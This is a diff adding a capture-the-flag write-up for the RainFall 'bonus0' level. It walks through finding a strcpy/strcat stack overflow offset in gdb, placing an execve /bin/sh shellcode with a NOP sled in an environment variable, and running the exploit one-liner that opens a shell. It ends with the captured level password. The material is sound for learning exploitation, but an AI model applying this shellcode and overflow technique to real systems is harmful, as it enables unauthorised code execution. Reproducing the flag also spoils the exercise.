@@ -1,0 +1,56 @@
+in this exercise we have the function main that is calling the function pp and then puts
+
+function pp call function p 2 time and then does strcpy and strcat, therse 2 functions can be vulnerable to overflow
+
+the function p read an input of size 4095 
+0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
+...
+0x080484e1 <+45>:	call   0x8048380 <read@plt>
+(python -c 'print("A"*4095+"\n"+"B"*9+"\xbf\xff\xfe\x60"[::-1]+"C"*4052)';cat ) | ./bonus0
+
+as we have no function system or exec we will return to a shellcode
+
+first we need to firstnd the offset
+
+$ gdb bonus0
+(gdb) r
+AAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBBBBBBBBBBBBBBBBB
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+so the overflow is on the second read buffer
+
+(gdb) r
+AAAAAAAAAAAAAAAAAAAAAAAAAA
+123456789112233445566778899
+
+Program received signal SIGSEGV, Segmentation fault.
+0x32323131 in ?? ()
+
+so the offset is at 1122 (position 9)
+
+we will exort shellcode to the env
+
+export SC=$(python -c 'print("\x90"*200+"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80")')
+
+lets find it's location
+
+(gdb) x/150s environ
+...
+0xbffffe5a:	 "SC=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\...
+
+so we pick an address in this variable
+
+0xbffffe60
+
+
+se our exploit will be  A*4095 + \n + A*9 + bffffe60 + A*4091
+
+
+bonus0@RainFall:~$ (python -c 'print("A"*4095+"\n"+"B"*9+"\xbf\xff\xfe\x60"[::-1]+"C"*4079)';cat ) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAABBBBBBBBB`���CCCCCCC��� BBBBBBBBB`���CCCCCCC���
+cd ../bonus1 ; cat .pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
